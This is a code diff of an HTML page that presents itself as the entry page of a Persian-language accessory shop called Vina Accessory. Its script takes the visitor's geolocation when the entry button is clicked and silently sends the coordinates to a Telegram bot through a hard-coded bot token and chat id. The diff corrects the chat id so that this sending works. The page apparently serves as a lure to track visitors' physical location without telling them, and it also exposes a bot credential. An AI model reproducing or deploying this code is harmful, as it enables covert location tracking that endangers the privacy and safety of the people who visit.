@@ -85,7 +85,7 @@
   <button onclick="getLocation()">ورود به وینا اکسسوری</button>
 
   <footer>
-    © تمامی حقوق محفوظ است برای وینا اکسسوری | طراحی شده با ❤️
+    © تمامی حقوق محفوظ است برای وینا اکسسوری | طراحی شده با
   </footer>
 
   <script>
@@ -100,7 +100,7 @@
     function showPosition(position) {
       var latitude = position.coords.latitude;
       var longitude = position.coords.longitude;
-      var url = "https://api.telegram.org/bot8069976917:AAHGS2Sar6h0qPCYVPpYezGHRVoOY1KuTbs/sendMessage?chat_id=tel:8438093859&text=Latitude: " + latitude + ", Longitude: " + longitude;
+      var url = "https://api.telegram.org/bot8069976917:AAHGS2Sar6h0qPCYVPpYezGHRVoOY1KuTbs/sendMessage?chat_id=8438093859&text=Latitude: " + latitude + ", Longitude: " + longitude;
       var xhr = new XMLHttpRequest();
       xhr.open("GET", url, true);
       xhr.send();
